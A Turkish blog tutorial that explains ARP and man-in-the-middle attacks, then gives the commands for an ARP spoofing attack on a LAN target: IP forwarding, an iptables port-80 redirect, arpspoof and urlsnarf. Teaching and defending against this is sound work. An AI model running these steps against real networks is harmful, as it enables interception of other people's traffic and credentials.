---
title: Man in the Middle Saldırısı ve Arp Spoofing
category: blog
last_modified_at: 2016-12-27
---
Öncelikle ARP Nedir sorusuyla konumuza başlayalım. ARP türkçeye adres çözümleme protokolü olarak çevirilebilir. Yerel ağlarda en sık kullanılan arayüz ethernettir. Bu arayüzler birbirlerine veri gönderip alırken üretim aşamasında onlara tanımlanmış olan benzersiz 48 bitlik mac adreslerini kullanırlar. TCP/IP protokolü ise bu işlem sırasında 32 bitlik IP adreslerini kullanırlar. Yani yerel ağda veri akışının sağlanması için cihazın mac adresi bilinmelidir. Bu veri akşı esnasında kullanılan protokole, yani IP adresi bilinen bir cihazın mac adresinin çözümlenmesi protokolüne Address Resolution Protocol(ARP) ismi verilir.

Şimdi bir cihazın IP adresini bildiğimiz fakat mac adresini bilmediğimiz durumlarda bütün ağa ARP isteği gönderelim. Böyle bir senaryoda bütün ağa yayın yapan (broadcast) paketi yolladığımızda, bu yayına sadece IP adresi uyuşan cihaz cevap verecek ve diğer cihazlar cevap vermeyecektir ve bu cevap cihazın mac adresi olacaktır. Ayrıca ARP isteği yapan cihaz ve ARP isteğini cevaplayan cihazlar birbirlerinin mac adreslerini daha sonra tekrar kullanmak için ARP Önbelliğine kaydeder.

Şimdi de MITM saldırısı ne demek bunu inceleyelim. Man in the middle saldırısı ya da türkçeye çevirirsek ortadaki adam saldırısı, bir network üzerinde hedef bilgisayar ile modem, server, switch, router gibi araçların arasına girerek verileri dinleme ve yakalama ilkesine dayanan bir saldırı türüdür. Ağda gönderilmiş bir paketi yakalayıp, destination Mac adresini kendisine göre düzenler ve bundan sonra gönderilen bütün paketler ilk olarak saldırganın bilgisayarına gider. Bu sayede şifreler, kredi kartı bilgileri gibi bilgiler saldırganın eline geçmiş olur.

> <h4>Yerel ağ üzerindeki cihazlara</h4> ARP Poisoning
> 
> DNS Spoofing
> 
> Port Stealing
> 
> STP Mangling <h4>Yerel Ağdan uzak cihazlara gateway ile</h4> ARP
> Poisoning (ARP Zehirlenmesi)
> 
> DNS Spoofing (DNS Önbellek Zehirlenmesi, Aldatma)
> 
> DHCP Spoofing (DHCP Aldatma)
> 
> ICMP Redirection
> 
> IRDP Spoofing
> 
> Route Mangling <h4>Uzak Ağa</h4> DNS Poisoning (DNS Zehirlenmesi)
> 
> Traffiec Tunneling
> 
> Route Mangling
> 
> saldırı türlerini yapabiliriz.

Şimdi bir saldırı örneği yaparak konuyu daha iyi kavrayalım.

Aşağıdaki "ifconfig" çıktıları saldırıyı yapacağım bilgisayara ait

![spoof1](https://www.hubeybi.com/wp-content/uploads/2017/06/spoof1.jpg)

İlk önce saldırıyı gerçekleştireceğim bilgisayarın IP yönlendirme durumunu öğrenmek için aşağıdaki komutu yürütüyorum.

    cat /proc/sys/net/ipv4/ip_forward

&nbsp;

Eğer aldığım çıktı 0 (sıfır) ise yönlendirme aktif değil sonucuna ulaşıyorum ve aktif hale getirmek için aşağıdaki komutu yürütüyorum.

    echo 1 > /proc/sys/net/ipv4/ip_forward

&nbsp;

Şimdi IP yönlendirmeyi aktif ettiğime göre ARP zehirleme işlemini başlatabilirim.ardından aşağıdaki komutu yürütüyorum.

    iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 8080

&nbsp;

![spoof2](https://www.hubeybi.com/wp-content/uploads/2017/06/spoof2.png)

&nbsp;

    arpspoof -i “interface” -t “ip_adres” “gateway”

&nbsp;

![spoof3](https://www.hubeybi.com/wp-content/uploads/2017/06/spoof3.png)

Üst bölümdeki resimde de görüldüğü üzere ilk önce hangi portların dinleneceği belirtiliyor. Şimdi saldırı yaptığımız bilgisayarın gateway ve IP bilgilerini girerek arp reply paketlerini göndermeye başlayacağım. şimdi aşağıdaki komutu yürütererek saldırı yapacağım bilgisayarı izlemeye alabilirim.

    urlsnarf -i eth1

&nbsp;

![spoof4](https://www.hubeybi.com/wp-content/uploads/2017/06/spoof4.png)

Buradan sonra bize beklemek düşüyor. Saldırı yaptığımız internete bağlandığında ve paketler göndermeye başladığında bu paketler tamamen bizim kontrolümüzde olacak.